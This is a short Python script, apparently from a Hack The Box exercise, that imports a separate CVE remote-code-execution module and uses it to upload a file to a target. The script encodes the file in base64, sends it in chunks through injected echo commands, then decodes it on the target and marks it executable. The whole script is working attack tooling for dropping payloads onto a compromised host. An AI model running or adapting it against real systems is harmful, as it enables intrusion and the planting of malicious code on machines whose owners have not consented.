#!/usr/bin/env python3
"""Upload file to target via CVE RCE base64 chunks."""
import base64
import time
import sys
from pathlib import Path
import importlib.util

spec = importlib.util.spec_from_file_location(
    "cve", r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\cve_rce.py"
)
cve = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cve)

src = Path(sys.argv[1])
dst = sys.argv[2]
data = src.read_bytes()
b64 = base64.b64encode(data).decode()
chunk = 30000
print(f"upload {src} ({len(data)} bytes) -> {dst}")
cve.run(f"rm -f {dst}.b64 {dst}", timeout=5)
time.sleep(0.5)
for i in range(0, len(b64), chunk):
    part = b64[i : i + chunk]
    cve.run(f"echo -n '{part}' >> {dst}.b64", timeout=8)
    print(f"  chunk {i//chunk+1}/{(len(b64)+chunk-1)//chunk}")
    time.sleep(0.3)
cve.run(f"base64 -d {dst}.b64 > {dst} && chmod +x {dst} && ls -la {dst}", timeout=10)
print("done")
